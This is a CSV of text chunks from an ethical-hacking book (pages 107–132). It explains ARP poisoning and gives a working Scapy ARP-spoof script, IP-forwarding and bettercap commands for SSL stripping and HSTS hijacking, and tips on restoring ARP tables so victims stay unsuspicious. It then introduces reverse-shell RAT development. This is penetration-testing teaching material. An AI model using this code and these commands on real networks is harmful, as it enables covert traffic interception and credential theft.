filename,page_number,chunk_number,chunk
Python Ethical Hacking from Scratch.pdf,107,1,"94 Man in the Middle Attacks Why do we need ARP? In the previous chapters, we mentioned what an address resolution protocol is. In this chapter, we will look at it in more depth. In the local network, communication takes place between devices using MAC addresses instead of IP addresses. These are also called link layer addresses . ARP is "
Python Ethical Hacking from Scratch.pdf,107,2,"a request response protocol, which means that one device requests a service and the other one replies in response to that request. Suppose that two devices are present in a network with no external internet connectivity. For them to communicate with each other, they need to rely on a underlying protocol, which is known as the layer 2 prot"
Python Ethical Hacking from Scratch.pdf,107,3,"ocol. We've already briefly learned about ARP tables. By using an ARP table, a device can maintain a list of all active devices on the network by using a mapping of their IP and MAC addresses. This ARP table technique is quite old and was designed without security considerations in mind. It has some inherent weaknesses that can be exploit"
Python Ethical Hacking from Scratch.pdf,107,4,"ed, as we will see in later sections. ARPpoisoning Before we learn about ARP poisoning, let's look at the ARP again. ARP is basically a program that's installed on your PC that performs all tasks related to ARP automatically, without needing any input from the user. To get an address from a machine, it puts FF:FF:FF:FF:FF:FF as a broadca"
Python Ethical Hacking from Scratch.pdf,107,5,"st address in its request. It does this to send the request to all the active devices in the network while asking the relevant question. Subsequently, the intended device replies with the appropriate answer. Let's take a look at the following diagram to see how ARP requests and responses are generated: Figure 5.1 – ARP requests and responses"
Python Ethical Hacking from Scratch.pdf,108,1,"Why do we need ARP? 95 Device A sends a request and device B replies with an answer, along with its MAC address. Looks pretty straightforward, right? Actually, there is a design flaw in this protocol. When device B receives a request, it has no w"
Python Ethical Hacking from Scratch.pdf,108,2,"ay of knowing whether the information being provided by the requesting device is correct or not. In this way, you can easily spoof the packets. More on this in a moment. Let's consider a simple scenario: Figure 5.2 – Internet communication Let's "
Python Ethical Hacking from Scratch.pdf,108,3,"say device A wants to communicate with an internet-based device. As we already know, it can't directly connect to the internet by itself – it must go through a gateway. The corresponding IP and MAC address of the device are shown in the following"
Python Ethical Hacking from Scratch.pdf,108,4," image. Device A and the gateway maintain their own ARP tables. For device A to send a request to the external server, it will look inside its own ARP table to find the MAC address of the gateway device. Once it successfully finds the device's MA"
Python Ethical Hacking from Scratch.pdf,108,5,"C address, it will send the request to the gateway. This is represented by step 1 in the preceding diagram. If there is only one device in the local network, the ARP table in device A will look something like this: Figure 5.3 – ARP table in device A"
Python Ethical Hacking from Scratch.pdf,109,1,"96 Man in the Middle Attacks Now, since the gateway is a bridge between a local network and the internet, I will figure out the external IP address for the packet. Then, using its own external or public IP address, it will forward the request to the server located at 77.88.99.11 . This is step 2. The server will process the request and reply to the router in step 3 . The router will receive this reply and figure out where the"
Python Ethical Hacking from Scratch.pdf,109,2," external packet should go to. How does it figure out where the packet should go? As you may have guessed, it will look at the destination address and destination port. Using its own ARP table, it will see where the respective device is located. The ARP table in the router will look like this: Figure 5.4 – ARP table in the router In step 4 , the router will simply forward the reply to the intended recipient. So far, we've lea"
Python Ethical Hacking from Scratch.pdf,109,3,"rned how a normal request response works. Now, we will add an additional player called the hacker/pentester. ARP works in the following way. As we already know, devices keep connecting and disconnecting to a network all the time, so the ARP program doesn't keep this ARP table indefinitely. Another reason for this is that the dynamic host control protocol (DHCP ) server automatically assigns IP addresses to devices in a networ"
Python Ethical Hacking from Scratch.pdf,109,4,"k. So, when a device goes offline, the IP address becomes available again so that it can be assigned to new connected devices. For this reason, devices in a network periodically send ARP responses to other devices in a network to let them know of their current IP and MAC addresses. This ensures that all the devices have an updated record of the IP and MAC addresses. Now, when a device receives an ARP response, it just updates"
Python Ethical Hacking from Scratch.pdf,109,5," its ARP table without any authentication or validation. Y ou can see the problem here, right? If a device creates an ARP response with fake information and sends it over to a victim/target machine, the receiving device will update its ARP table with fake information, without validating the correctness of the data. Another weakness in the ARP protocol is that it allows us to accept responses, even if it didn't send a request."
Python Ethical Hacking from Scratch.pdf,110,1,"Why do we need ARP? 97 Let's take a look at what happens when we add a malicious actor to a network: Figure 5.5 – Attacker added to the network Here, device B, which belongs to the hacker, will generate two fake ARP responses – one for the victim and one for the gateway router. It"
Python Ethical Hacking from Scratch.pdf,110,2," will send an arp reply to device A and pretend to be a router. Similarly, it will send a reply to the router and pretend to be device A. Now, both device A and the router will update their ARP tables with this new fake information. Now, if device A makes the same request as it di"
Python Ethical Hacking from Scratch.pdf,110,3,"d in the previous case to the external server, instead of the request going to the router, the request will go to the attacker. The attacker can then choose to forward the request to the router. At this point, the router will think the request is coming from device A while in real"
Python Ethical Hacking from Scratch.pdf,110,4,"ity, the request is coming from device B. Device B is, in fact, intercepting all the network traffic between the router and device A. Remember the CIA triad, which we learned about previously? Can you figure out which rule is being violated here? All three rules can be broken here"
Python Ethical Hacking from Scratch.pdf,110,5,", depending on what the hacker intends to do with the information here. Now, the hacker is effectively the man in the middle between the router and device A. This is why it is called a man in the middle (MITM) attack. This vulnerability is very well known and is called ARP poisoning."
Python Ethical Hacking from Scratch.pdf,111,1,"98 Man in the Middle Attacks Important Note The ARP table gets reset after a certain period of time, so just sending one packet to spoof is not going to work properly. To be able to successfully spoof for longer"
Python Ethical Hacking from Scratch.pdf,111,2," periods, you need to constantly send these fake manufactured packets so that ARP tables don't get reset after a certain time. Building an ARP spoof program In this section, we will learn how to build an ARP spo"
Python Ethical Hacking from Scratch.pdf,111,3,"of program. Before we move on, let's take a look at the ARP tables again in both Kali as well as the Windows. The ARP table in Kali Linux is as follows: Figure 5.6 – ARP table in Kali Linux The ARP table in Wind"
Python Ethical Hacking from Scratch.pdf,111,4,"ows looks like this. Take a look at the highlighted fields: Figure 5.7 – ARP table in Windows 10 As you can see, they have the correct MAC addresses for the router located at 192.168.74.2 . Kali is located at 19"
Python Ethical Hacking from Scratch.pdf,111,5,"2.168.74.128 , while Windows 10 is located at 192.168.74.129 . To spoof these devices, we will take on this problem step by step. First, we will tackle spoofing the victim machine with the MAC address of the router."
Python Ethical Hacking from Scratch.pdf,112,1,"Building an ARP spoof program 99 Arpspoofproject Open VS Code in Kali Linux and create a new project named ARP spoof. Install the virtual environment, as shown in Chapter 2, Getting Started – Setting Up A Lab Environment . Once t"
Python Ethical Hacking from Scratch.pdf,112,2,"he virtual environment has been installed, enable the virtual environment by writing the following command: source venv/bin/activate This will activate the new virtual environment. Install the Scapy module inside this environment a"
Python Ethical Hacking from Scratch.pdf,112,3,"nd create a new file named main.py . To import all the scapy modules in one line without having to explicitly import everything separately, you can write the following line: from scapy.all import * * means that we want to import al"
Python Ethical Hacking from Scratch.pdf,112,4,"l the modules present in scapy . As we learned in the previous section, to spoof, we have to create fake responses. First, we will create a response intended for the victim. To do this, we will create an arp packet and see what fie"
Python Ethical Hacking from Scratch.pdf,112,5,"lds can be set in it. To create an ARP packet and to see which fields are present, we can write the following code: arp_response = ARP() print(arp_response.show()) The output of this code looks like this: Figure 5.8 – ARP packet fields"
Python Ethical Hacking from Scratch.pdf,113,1,"100 Man in the Middle Attacks The fields that we are interested in start from op onward. Op stands for operation or type of packet. This is a who has operation, which means that it is an ARP request. But we are interested in creating an ARP response instead. hwsrc is the MAC address of the Kali machine and similarly, psrc is its IP address. hwdst "
Python Ethical Hacking from Scratch.pdf,113,2,"and pdst haven't been set for this packet yet. Now, we will make the following modifications in this packet in order to spoof the victim: • Change op to 2, implying that this is a response ARP packet, not a request. Note that by default, this value is 1, which means it corresponds to the who-has operation. • Change the psrc address field to make i"
Python Ethical Hacking from Scratch.pdf,113,3,"t equal to the value of the IP address of the router. Since our router is located at 192.168.72.2 , we will set this field to this value. • Lastly, we will set pdst to the ip address of the victim machine, which is 192.168.74.129 . We will also set the hwdst address, which is the victim's MAC address. To see the MAC address of the Windows machine,"
Python Ethical Hacking from Scratch.pdf,113,4," you can write the following command in the Command Prompt or use the network scanner we created in the previous chapter: Ipconfig /all Once you have the necessary information, proceed to Python to make the following changes: arp_response.op = 2 arp_response.pdst = ""192.168.74.129"" // windows IP arp_response.hwdst = ""00:0C:29:BE:47:14"" // windows "
Python Ethical Hacking from Scratch.pdf,113,5,"mac arp_response.hwsrc = ""00:0c:29:90:79:02"" // kali mac arp_response.psrc = ""192.168.74.2"" // fake field value Only the last field is crafted; we will be sending it from 192.168.74.128 while pretending to be at 192.168.74.2 . Once all the fields have been set, you can print them to see if they have been defined correctly: print(arp_response.show())"
Python Ethical Hacking from Scratch.pdf,114,1,"Building an ARP spoof program 101 The following screenshot shows the spoofed packet according to the code we wrote previously: Figure 5.9 – Spoofed ARP packet Here, you c"
Python Ethical Hacking from Scratch.pdf,114,2,"an see that the op field is now a response instead of request. The field value is now is-at . Similarly, the psrc field is pretending to be the IP of the router instead o"
Python Ethical Hacking from Scratch.pdf,114,3,"f Kali. Note that we haven't sent the packet yet. To send this packet, we can simply use the send function: send(arp_response) Now, if you run this program and quickly go"
Python Ethical Hacking from Scratch.pdf,114,4," to the Windows machine before the arp table gets reset, you will see that the arp table of the Windows machine has been poisoned and that its arp table entry shows the w"
Python Ethical Hacking from Scratch.pdf,114,5,"rong MAC address for the 192.168.72.2 gateway. Instead of pointing to the actual gateway, it now points to Kali's MAC address: Figure 5.10 – Poisoned ARP table in Windows"
Python Ethical Hacking from Scratch.pdf,115,1,"102 Man in the Middle Attacks Compare this with Figure 5.6 for the value of 192.168.74.2 . Here, you can see that the value of the physical address in this new table has been modified. Note that if you take too long to view this value, it will be reset a"
Python Ethical Hacking from Scratch.pdf,115,2,"utomatically. We will learn how to stop it from being reset automatically for a longer poisoning period in a moment. Now, let's create a function so that we can call it easily: def spoof_victim(): arp_response = ARP() arp_response.op = 2 arp_response.pds"
Python Ethical Hacking from Scratch.pdf,115,3,"t = ""192.168.74.129"" arp_response.hwdst = ""00:0C:29:BE:47:14"" arp_response.hwsrc = ""00:0c:29:90:79:02"" arp_response.psrc = ""192.168.74.2"" send(arp_response) We will create a similar function to spoof the router as well: def spoof_router(): arp_response ="
Python Ethical Hacking from Scratch.pdf,115,4," ARP() arp_response.op = 2 arp_response.pdst = ""192.168.74.2"" // router's IP arp_response.hwdst = ""00:50:56:ff:74:8b"" // router's mac arp_response.hwsrc = ""00:0c:29:90:79:02"" // kali's mac arp_response.psrc = ""192.168.74.129"" // fake pretending to be dev"
Python Ethical Hacking from Scratch.pdf,115,5,"ice A. send(arp_response) In this function, we have changed the values of pdst , hwdst , and psrc . The complete program is as follows: from scapy.all import * def spoof_victim(): arp_response = ARP() arp_response.op = 2 arp_response.pdst = ""192.168.74.129"""
Python Ethical Hacking from Scratch.pdf,116,1,"Building an ARP spoof program 103 arp_response.hwdst = ""00:0C:29:BE:47:14"" arp_response.hwsrc = ""00:0c:29:90:79:02"" arp_response.psrc = ""192.168.74.2"" send(arp_response) def spoof_router(): arp_response = ARP() arp_re"
Python Ethical Hacking from Scratch.pdf,116,2,"sponse.op = 2 arp_response.pdst = ""192.168.74.2"" arp_response.hwdst = ""00:50:56:ff:74:8b"" arp_response.hwsrc = ""00:0c:29:90:79:02"" arp_response.psrc = ""192.168.74.129"" send(arp_response) if __name__ == ""__main__"": spo"
Python Ethical Hacking from Scratch.pdf,116,3,"of_victim() spoof_router() Note that this will only spoof these devices once. To create a permanent spoofing, we can add these function calls to a loop and continuously send these packets after a certain delay. This w"
Python Ethical Hacking from Scratch.pdf,116,4,"ay, the arp tables will not get a chance to reset and you will be able to permanently spoof these devices, as long as your spoof program is running. We can also try to put an exit condition in a loop. We will use Keyb"
Python Ethical Hacking from Scratch.pdf,116,5,"oardInterrupt to exit. Use the following code to send packets continuously after a delay of every 2 seconds: try: while True: spoof_victim() spoof_router() time.sleep(2) except KeyboardInterrupt as err: print(""exiting"")"
Python Ethical Hacking from Scratch.pdf,117,1,"104 Man in the Middle Attacks Note that you will need to import the time module at the top of file. Although our spoofing program looks complete, there is a slight problem – if the victim now tries to request"
Python Ethical Hacking from Scratch.pdf,117,2," an internet server, they will see an internet connectivity issue. Run the arp spoof program on Linux and go to the Windows machine and try to access a website. Y ou will see a window similar to the following"
Python Ethical Hacking from Scratch.pdf,117,3,": Figure 5.11 – No connection This is because the packets are going to the Kali machine but it is blocking packets from being forwarded. To enable packet forwarding, run the following command on your Linux Te"
Python Ethical Hacking from Scratch.pdf,117,4,"rminal: sysctl -w net.ipv4.ip_forward=1 This will enable IP forwarding on the Kali machine. Now, the Windows user will be able to access the internet without even noticing that someone is intercepting their t"
Python Ethical Hacking from Scratch.pdf,117,5,"raffic: Figure 5.12 – Enabling IPv4 forwarding Now, if you go to the Windows machine and try to access a website again, you should have internet connectivity. Now, your spoof program should be working perfectly."
Python Ethical Hacking from Scratch.pdf,118,1,"Monitoring traffic 105 Monitoring traffic To see what the user is doing, you can open Wireshark on Kali and select the eth0 interface to see all the traffic going over the network. To see only the traffic originating from the Windows machine, you can set a filter in the filter menu. Use the following filter:"
Python Ethical Hacking from Scratch.pdf,118,2," ip.src == 192.168.74.129 This will only display the traffic that originates from the Windows machine. Now, if you were to go to the Windows machine and access a website, you should see the packet arriving in Wireshark: Figure 5.13 – Wireshark traffic from a Windows machine In this section, we learned how to"
Python Ethical Hacking from Scratch.pdf,118,3," poison an ARP table and monitor the network traffic between the victim device and the internet. In the next section, we will learn how this network traffic is encrypted and how this encryption can be broken. Encrypted traffic In the early days of the internet, internet traffic was mostly text-based, so ever"
Python Ethical Hacking from Scratch.pdf,118,4,"yone sniffing over the network could see exactly what was being sent over it. This was extremely unsecure and people could not send sensitive information such as passwords over the network. Since then, the internet has come a long way. Now, most internet traffic, except for some really old websites, is secur"
Python Ethical Hacking from Scratch.pdf,118,5,"e and uses encryption. This means that even if you can see the traffic, you will not be able to read it since it is encrypted. If you see the https tag on a website's URL, this means that the network traffic is encrypted and can't be read over the wire. There are tools that can be used to decrypt this traffic."
Python Ethical Hacking from Scratch.pdf,119,1,"106 Man in the Middle Attacks Restoring ARP tables manually Now that we have seen how to successfully spoof packets, when we close our program by using a keyboard interrupt, such as Ctrl + C, we will see that the internet becomes unavailable again on "
Python Ethical Hacking from Scratch.pdf,119,2,"our Windows machine. This is because the ARP tables have been poisoned and we haven't restored them, so they don't know where to route the network traffic. This will automatically reset itself after a couple of minutes. However, this can raise suspici"
Python Ethical Hacking from Scratch.pdf,119,3,"on for the victim, and they might realize that someone is tampering with their network traffic. To avoid this, we can restore these tables by sending over correct information when we exit the program. We can use the following program to restore the co"
Python Ethical Hacking from Scratch.pdf,119,4,"rrect values: def restore(): # restoring router table arp_response = ARP() arp_response.op = 2 arp_response.pdst = ""192.168.74.2"" arp_response.hwdst = ""00:50:56:ff:74:8b"" arp_response.hwsrc = ""00:0C:29:BE:47:14"" arp_response.psrc = ""192.168.74.129"" se"
Python Ethical Hacking from Scratch.pdf,119,5,"nd(arp_response) #restoring windows table arp_response = ARP() arp_response.op = 2 arp_response.pdst = ""192.168.74.129"" arp_response.hwdst = ""00:0C:29:BE:47:14"" arp_response.hwsrc = ""00:50:56:ff:74:8b"" arp_response.psrc = ""192.168.74.2"" send(arp_response)"
Python Ethical Hacking from Scratch.pdf,120,1,"Decrypting the network traffic 107 Note that these values are for my platform; they will be different for your platform, so you should change these values accordingly. To restore the ARP table, send these values to the router from our Linux machine while pretending to be device A. This time, instead of entering fake information, enter the correct values. Do the same for the Windows mach"
Python Ethical Hacking from Scratch.pdf,120,2,"ine. Finally, call this function when a keyboard interrupt occurs, as shown here: try: while True: spoof_victim() spoof_router() time.sleep(2) except KeyboardInterrupt as err: print(""restoring ARP tables"") restore() print(""exiting"") In this section, we learned how to poison an ARP table, monitor the network traffic, and restore the ARP tables in the victim machines to make sure they're "
Python Ethical Hacking from Scratch.pdf,120,3,"not suspicious of our activity. Next, we will learn how to decrypt this network traffic. Decrypting the network traffic As we saw in the previous section, we can intercept traffic using a man in the middle attack. However, this attack is rarely useful on its own since all the browser traffic nowadays is encrypted, so even if you were able to intercept traffic, you won't be able to do mu"
Python Ethical Hacking from Scratch.pdf,120,4,ch. Y ou can bypass this procedure by using SSL stripping. Intercepting traffic without encryption is also sometimes useful when you want to monitor a user's activity. This can help you figure out which websites a user is visiting the most. Using this information alongside social engineering attacks can help you compromise the victim's machine. HTTPS versus HTTP To understand how SSL st
Python Ethical Hacking from Scratch.pdf,120,5,"ripping works, we need to understand how the hypertext transfer protocol (HTTP) and HTTPS protocols work. HTTPS is a secure version of HTTP , as indicated by the S at the end of its name. It was developed in the early days of the internet, when information was sent in the form of human readable text and anyone intercepting or monitoring the traffic could potentially see what was going on."
Python Ethical Hacking from Scratch.pdf,121,1,"108 Man in the Middle Attacks A typical HTTP request would look something like this: Figure 5.14 – HTTP request As you can see, the body of the HTTP request is in the form of plain text, which means i"
Python Ethical Hacking from Scratch.pdf,121,2,"t can be read easily. So, if you were to send your email or password in plain text to the server, the hacker could potentially steal your credentials. Y ou already know how dangerous this can be. To a"
Python Ethical Hacking from Scratch.pdf,121,3,"void this problem, HTTPS was developed, which could encrypt the body of the message so that only the server and requestor can read it with the proper encryption keys – no middle man can read it. Once "
Python Ethical Hacking from Scratch.pdf,121,4,"the server receives the request, it will respond with the appropriate reply. The server's reply would look like this: Figure 5.15 – HTTP reply The last line represents the body of the reply, which is "
Python Ethical Hacking from Scratch.pdf,121,5,"the web page that the user requested. In the case of HTTPS, the body of these requests and responses would be encrypted and appear as gibberish to the attacker. Now, let's focus on how we can bypass this."
Python Ethical Hacking from Scratch.pdf,122,1,"Decrypting the network traffic 109 BypassingHTTPS Although the majority of websites nowadays support HTTPS instead of HTTP , on the server side, in order to maintain backward comp"
Python Ethical Hacking from Scratch.pdf,122,2,"atibility, the server still allows requests to come from HTTP and once they receive them, they will check whether the client/ requestor supports HTTPS or not. We can take advantage"
Python Ethical Hacking from Scratch.pdf,122,3," of this to bypass this security mechanism. The following diagram shows how HTTP requests work with a web server: Figure 5.16 – HTTP cycle When the client first accesses a website,"
Python Ethical Hacking from Scratch.pdf,122,4," it is usually over HTTP protocol, so it sends an unsecure request to initiate a connection. The server receives this request and asks the client whether it supports HTTPS or not. "
Python Ethical Hacking from Scratch.pdf,122,5,"If the client supports HTTPS, the server will say, Why don't you talk with me over HTTPS?. The client then switches to HTTPS. Once this happens, all the communication is encrypted."
Python Ethical Hacking from Scratch.pdf,123,1,"110 Man in the Middle Attacks This is where we will introduce our middle man attacker . We will do so in a way to fool both the server and the client. Let's take a look at the following diagram: Figure 5.17 – MITM attack with SSL stripping During the first phase, the client will make an HTTP request to the server. The attacker is sitting betwe"
Python Ethical Hacking from Scratch.pdf,123,2,"en the client and the server and is using the arp spoofing program to monitor the traffic that we developed in the previous chapter. They will take this request from the client, convert it into an HTTPS request, and forward it to the server. The server will think that the client is talking over HTTPS instead of HTTP . Similarly, the attacker w"
Python Ethical Hacking from Scratch.pdf,123,3,"ill take replies from the server, decrypt them, and read what is happening. Once they've done that, they will forward them to the victim/client. In this way, the victim will think that the server is talking over HTTP , while the server will think that the client is talking over HTTPS. Meanwhile, the attacker is reading all the network traffic."
Python Ethical Hacking from Scratch.pdf,123,4," The job of the attacker is to encrypt and decrypt the SSL certificates that are used by servers for authenticating security on the transport layer. They form the basis of secure communication. Learning how to perform SSL stripping is outside the scope of this book as it requires extensive knowledge of networking, which could be a book on its "
Python Ethical Hacking from Scratch.pdf,123,5,own. Our goal here is to compromise the system using this tool. We will use a famous SSL stripping tool called bettercap to do so. We will use version 2.23. Note that the latest tools for this component don't seem to work properly. It can be found at https://github.com/ bettercap/bettercap/releases/download/v2.23/bettercap_linux_ amd64_2.23.zip .
Python Ethical Hacking from Scratch.pdf,124,1,"Decrypting the network traffic 111 Download this tool and run it on Linux. Once you've downloaded it, put this zipped file in your desired location on Kali Linux and extract the module. Y ou will see an executable named bettercap . Y ou could directly run this executable and it wo"
Python Ethical Hacking from Scratch.pdf,124,2,"uld work just fine. However, I recommend putting this in the /usr/bin/ directory so that you can access it from anywhere, so copy this file into / usr/bin/ . To copy the file, use the following command: sudo cp bettercap /usr/bin/bettercap Once copied, simply open a Terminal and t"
Python Ethical Hacking from Scratch.pdf,124,3,"ype bettercap to run the file. Before proceeding, we need to do a couple of things to start it. Write the following command: sudo bettercap The interface will look like this: Figure 5.18 – bettercap version Next, you need to update a couple of things; that is, some internal files "
Python Ethical Hacking from Scratch.pdf,124,4,"for this module called caplets. Don't worry – you don't need to understand much about caplets here. Just write the following commands and let the magic happen: caplets.update This will download some files and update them. Exit this program to let the changes take place. Now, let's"
Python Ethical Hacking from Scratch.pdf,124,5," run the program again with the following command: sudo bettercap –-silent -iface eth0 This command will run bettercap in silent mode while using eth0 as its main network interface. To see which devices are available on the network, you can type in the following command: net.probe on"
Python Ethical Hacking from Scratch.pdf,125,1,112 Man in the Middle Attacks The output of this command will look something like this: Figure 5.19 – Live hosts on the network Let's try to use the internal arpspoof prog
Python Ethical Hacking from Scratch.pdf,125,2,ram for this application. Type in the following command to set up arp spoofing for our Windows machine: set arp.spoof.targets 192.168.74.129 This will set up the victim. T
Python Ethical Hacking from Scratch.pdf,125,3,"o start the arp spoofing program, we can write the following command: set arp.spoof.internal true set arp.spoof on This will start spoofing the devices: Figure 5.20 – Devi"
Python Ethical Hacking from Scratch.pdf,125,4,"ce spoofing At this point, we've come to the SSL stripping part. To start stripping the HTTPS traffic, we need to go to the Windows machine and clear all browsing history."
Python Ethical Hacking from Scratch.pdf,125,5," This will ensure that we don't load the cached versions of the websites. If you want to see what services are running on bettercap , you can use the following help command:"
Python Ethical Hacking from Scratch.pdf,126,1,"Decrypting the network traffic 113 Figure 5.21 – Help command Next, to see the raw HTTP traffic, run the foll"
Python Ethical Hacking from Scratch.pdf,126,2,"owing command: hstshijack/hstshijack This will start stripping the traffic. Now, if you go to the Windows mac"
Python Ethical Hacking from Scratch.pdf,126,3,"hine and go to a website such as google.com , you will see that the website connection is unsecure. If you go"
Python Ethical Hacking from Scratch.pdf,126,4," to google.com , you will notice a Not secure tag before the URL. Y ou should now have an unsecure version of"
Python Ethical Hacking from Scratch.pdf,126,5," Google. If you go to your Kali Linux terminal where bettercap is running, you should see the network traffic."
Python Ethical Hacking from Scratch.pdf,127,1,"114 Man in the Middle Attacks Attention! Note that big companies such as Google, Facebook, and so on spend huge amounts of money on their security and are constantly trying to improve their protection methods, so one attack that works today might not work tomorrow. That is why penetration tester"
Python Ethical Hacking from Scratch.pdf,127,2,"s and cyber security defense teams are constantly involved in a chasing game. The goal of the previous example is to show how these methods work in practice. By the time you use it for yourself, things might have changed and this attack method may or may not work. It is important to stay updated"
Python Ethical Hacking from Scratch.pdf,127,3,". The purpose of this book is not to get you get stuck on using specific tools but to show you the way penetration testers and security analysts think. Summary In this chapter, we built on the knowledge we learned about in the previous chapter and used it to build an ARP spoof program, which ena"
Python Ethical Hacking from Scratch.pdf,127,4,"bled us to intercept traffic on a local network. Then, we learned how the HTTP and HTTPS protocols work and how they can be broken by man in the middle attacks. In next chapter, we will look at a more exciting topic: malware development. This can help us manually take charge of a victim's machin"
Python Ethical Hacking from Scratch.pdf,127,5,"e and perform certain tasks on it. By doing so, we will learn how to build a malware Remote Access Tool to take control of the victim's computer. We will build a program that will enable us to remotely take control of the victim's machine and perform several tasks on it. See you in the next chapter!"
Python Ethical Hacking from Scratch.pdf,128,1,"Section 3: Malware Development In this section, we will move on to a new topic. We will start with the malware development process and how you can create your own malware using Python. The ability to create your own malware is a very important aspect of eth"
Python Ethical Hacking from Scratch.pdf,128,2,"ical hacking. In Chapter 6, Malware Development , we will use socket programming to create a very basic malware remote access tool. This will allow you to develop malware that can be used to hack into victim machines. In Chapter 7, Advanced Malware , we wil"
Python Ethical Hacking from Scratch.pdf,128,3,"l develop more advanced features in the malware such as the ability to steal sensitive files from victim machines, and so on. In Chapter 8, Post Exploitation , we will discuss the aspects of post-exploitation, that is, things to do on a victim machine once "
Python Ethical Hacking from Scratch.pdf,128,4,you have gained access to it. The final chapter deals with system protection – how you can protect your system from getting attacked and what weaknesses hackers exploit to take control of your system. We will also discuss how you can make your malware persi
Python Ethical Hacking from Scratch.pdf,128,5,"stent and gain control of the victim machine whenever you want. This part of the book comprises the following chapters: • Chapter 6, Malware Development • Chapter 7, Advanced Malware • Chapter 8, Post Exploitation • Chapter 9, System Protection and Perseverance"
Python Ethical Hacking from Scratch.pdf,130,1,"6 Malware Development In previous chapters, we have learned how to gather information pertaining to the user and how this information can be used "
Python Ethical Hacking from Scratch.pdf,130,2,"to attack the victim. In this chapter, we will move toward a new dimension and develop a Remote Access Tool (RAT ). RATs allow pen testers to gain"
Python Ethical Hacking from Scratch.pdf,130,3, access to victims' computers remotely and are widely used in the field of cybersecurity. There are much more advanced RAT programs available on t
Python Ethical Hacking from Scratch.pdf,130,4,"he internet. However, the goal of this chapter is to help you build your own RAT, which will give you far more advanced control. In this chapter, "
Python Ethical Hacking from Scratch.pdf,130,5,we will cover the following topics: • Introduction to RATs • Socket programming in Python • Creating malware • Running commands remotely on the victim
Python Ethical Hacking from Scratch.pdf,131,1,"118 Malware Development Understanding RATs RATs have been widely used in cybersecurity and there are a lot of popular RATs available. Some hackers even offer customized and hard-to-detect RATs to be used to gain access to a victim's computer. In its simplest form, an RAT is a program that creates a network connection with another computer and perfo"
Python Ethical Hacking from Scratch.pdf,131,2,"rms an action. RATs can be legitimate software, such as a common commercial software such as TeamViewer, which is often used by IT professionals to diagnose remote computers and to detect problems. However, these programs can also be used by hackers to get control of the victim's machine, so you should be very careful in how you use these programs."
Python Ethical Hacking from Scratch.pdf,131,3," In its simplest form, an RAT is a pair of programs. One program runs on the victim, while the other program runs on the attacker's machine. There are two main configurations in which these programs work depending on who initiates the communication. These are defined as follows: • A program in which the attacker initiates the connection, called a f"
Python Ethical Hacking from Scratch.pdf,131,4,"orward connection • A program that causes the victim's machine to create a connection to the hacker's machine, called a reverse connection Let's look at these in detail in the following sections. Forwardshell In modern computer systems, a forward connection is almost impossible since the security configuration of most PCs does not allow remote dev"
Python Ethical Hacking from Scratch.pdf,131,5,"ices to initiate a connection unless there are specific rules mentioned in the firewall. By default, all incoming connections are blocked by the firewall. These connections are only possible if an open port is present in the victim's machine that can be exploited by the hacker. However, you will find that this is not the case in most typical scenarios."
Python Ethical Hacking from Scratch.pdf,132,1,"Socket programming in Python 119 Reverse shell A reverse shell employs the opposite approach. Instead of the attacker initiating a connection to the victim, the attacker would plant a malware/payload (code that executes on the victim's machine). In this way, instead of an external connection, an internal connection from the victim would be initiated, which makes it much more difficult for Intrusion Detection Systems (IDSes) such as firewalls and antivirus programs to detect malicio"
Python Ethical Hacking from Scratch.pdf,132,2,"us activity on the system. The way this kind of attack is deployed is that the attacker sends a malicious file containing malware to the victim embedded in a PDF or JPEG file, for example. To the victim, it would look like an ordinary file, but when the victim clicks on the file to open it, a script is executed in the background that initiates a connection back to the attacker. Once the connection to the attacker is established, the attacker can easily take control of the victim's "
Python Ethical Hacking from Scratch.pdf,132,3,"machine and execute commands remotely on the victim's machine. Now that we have understood forward shells and reverse shells, let's move on to discuss sockets in Python. Socket programming in Python Before learning about malware development, it is necessary that we learn about network programming in Python and how we can create network applications. The first step in learning network programming is to learn about what we call sockets . Sockets provide a fundamental mechanism for cr"
Python Ethical Hacking from Scratch.pdf,132,4,"eating network-based applications and our malware is going to be essentially a network application. Let's start by understanding sockets first. Sockets Before we jump into socket programming, let's first understand what a network socket is and how it can be used to develop network-based applications. As we learned in previous chapters, the topmost layer in a network stack is an application layer. These are the applications that the user interacts with in everyday life. Now, the que"
Python Ethical Hacking from Scratch.pdf,132,5,"stion is, how do these applications, which are developed in different programming languages, communicate over the network? The answer lies in the use of sockets. A socket is defined here: https://docs.oracle.com/javase/tutorial/networking/sockets/ definition.html . A socket is one endpoint of a two-way communication link between two programs running on the network. A socket is bound to a port number so that the TCP layer can identify the application that data is destined to be sent to."
